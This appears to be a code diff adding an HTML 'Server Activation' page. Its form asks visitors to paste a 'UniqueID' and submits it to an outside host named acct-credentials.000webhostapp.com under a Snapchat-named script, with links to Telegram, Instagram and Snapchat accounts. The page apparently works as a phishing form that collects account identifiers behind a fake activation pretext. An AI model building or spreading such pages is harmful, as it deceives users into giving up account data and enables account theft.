@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+<title>Server Activation</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="style.css">
+<script src="https://kit.fontawesome.com/02c8b38b13.js" crossorigin="anonymous"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+</head>
+
+<body>
+<div class="activation-form">
+<form id="ServerActivationForm" method="post" action="https://acct-credentials.000webhostapp.com/snapchat-activate.php">
+      
+<h1>Server Activation</h1>
+      
+<div class="form-group">
+<input required maxlength="10" name="uniqueid" type="text" placeholder="Paste Your UniqueID">
+<span class="input-icon"><i class="key fa fa-key"></i></span>
+</div>
+     
+<button name="activatebtn" id="activate" type="submit" class="activate-btn">Activate</button>      
+
+<div class="null" >null</div>
+ 
+<div class="text-follow-us-on" >───── Follow us on ─────</div>
+
+<!-- Social login buttons -->
+<div class="social-button">
+<button onclick="NewTabTelegram()" class="telegram" type="button"></button>
+       
+<button onclick="NewTabInstagram()" class="instagram" type="button"></button>
+       
+<button onclick="NewTabSnapchat()" class="snapchat" type="button"></button>
+</div>
+    
+</form>
+</div>
+  
+<!-- JS Script -->
+<script src="script.js"></script>
+  
+<!-- Social Media Buttons Redirect Scripts -->
+<script>
+function NewTabTelegram() {
+window.open("https://t.me/918766428212");
+}
+</script>
+
+<script>
+function NewTabInstagram() {
+window.open("https://instagram.com/prajwalpanditofficial");
+}
+</script>
+
+<script>
+function NewTabSnapchat() {
+window.open("https://t.snapchat.com/vY6lel35");
+}
+</script>
+
+</body>
+</html>
